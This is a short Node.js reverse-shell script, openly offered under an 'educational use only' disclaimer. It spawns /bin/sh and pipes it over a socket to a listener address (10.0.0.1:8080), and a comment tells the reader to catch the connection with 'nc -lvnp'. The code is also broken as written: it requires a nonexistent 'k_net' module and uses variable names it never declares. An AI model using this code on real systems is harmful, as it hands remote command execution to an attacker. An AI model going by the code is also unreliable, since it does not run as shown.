// King Of Noobs is not resposible for any misuse.
// This script is for Educational use and Ethical use only.
// Before using the Script for a bad purpose, remeber that GOD is watching you.

/*

#Usage
- open terminal and use netcat's listener
- Example : nc -lvnp "port" 

*/



// reverse connection using node.js
(function(){
    //Declaring the requiremnents ..
    var k_net = require("k_net"),
        k_cp  = require("child_process"),
        k_sh  = cp.spawn("/bin/sh",[]);

    var k_client = new k_net.Socket(); //iiitiates a connection 
    client.connect(8080, "10.0.0.1", function(){   // change "8080" to the port number & "10.0.0.1" to the your ip 
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return/a/; // stopps the application from crashing 
})();


//King Of Noobs